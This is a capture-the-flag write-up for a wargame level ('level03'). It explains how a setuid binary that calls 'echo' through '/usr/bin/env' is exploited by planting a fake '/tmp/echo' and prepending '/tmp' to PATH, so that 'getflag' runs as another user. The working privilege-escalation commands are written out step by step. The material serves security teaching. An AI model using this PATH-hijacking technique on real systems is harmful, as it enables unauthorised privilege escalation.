# Level03 : find flag03

## Tutorial

1. Launching the `level03` binary : it says `Exploit me`
2. Checking the binary `strings ~/level03 | grep Exploit`:
   - result : `/usr/bin/env echo Exploit me`
   - we can see here that it loads the `env` for the command, we can use it by modifying the `$PATH`
3. Checking the permissions for `level03` binary, `ls -l level03` :  
   - result : `-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03`
   - we can see here the `setuid` and `setgid` are set ! This means that when we execute `level03`, we execute it with the `uid` of `flag03` and the `gid` of `level03`.
4. Checking available folders where we can write and execute scripts with `ls -l /` :
   - result : `d-wx-wx-wx  4 root root  100 Apr 10 08:09 tmp`
   - we can write and execute programs in the `/tmp` folder
5. Writing program in `/tmp/echo`, `cat /tmp/echo` :
   - result : `getflag`
   - permissions (`ls -l /tmp/echo`): `----r-x--- 1 level03 level03 8 Apr 10 08:10 /tmp/echo`
   - these are the minimum permissions for `/tmp/echo` because we are executing `~/level03` with the `gid` of `level03` so it needs to be able to `r` and `x`, then `getflag` is executed with the `uid` of `flag03`
6. Executing `PATH=/tmp:$PATH ~/level03` by passing `/tmp` as file containing binaries
7. get flag for level03 !

## Notes

- Create file `/tmp/echo`
  - content : `getflag`
- Execute `PATH=/tmp:$PATH echo lol`
  - result : `lol`
- Execute `PATH=/tmp:$PATH /usr/bin/env echo`
  - result : `Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)`
- Summary : `/usr/bin/env` loads the environment variables of the user, this is necessary for the exploit.
- This is done because the `cat /etc/environment` set the `$PATH` variable for all users :
  - result : `PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"`
  - Source : https://stackoverflow.com/questions/1641477/how-to-set-environment-variable-for-everyone-under-my-linux-system
- Interesting discussion on the use of `/usr/bin/env` :
  - url : https://unix.stackexchange.com/questions/29608/why-is-it-better-to-use-usr-bin-env-name-instead-of-path-to-name-as-my

## Additional resources

- Permissions (suid, sgid, sticky bit)
  - https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/
  - https://linux.goffinet.org/administration/securite-locale/permissions-linux/
  - https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits
- Alias don't execute in scripts by default, need to set the shell as interactive :
  - possible other solution, doesn't work here (check link) : `alias echo=getflag`
  - https://stackoverflow.com/questions/30130954/alias-doesnt-work-inside-a-bash-script
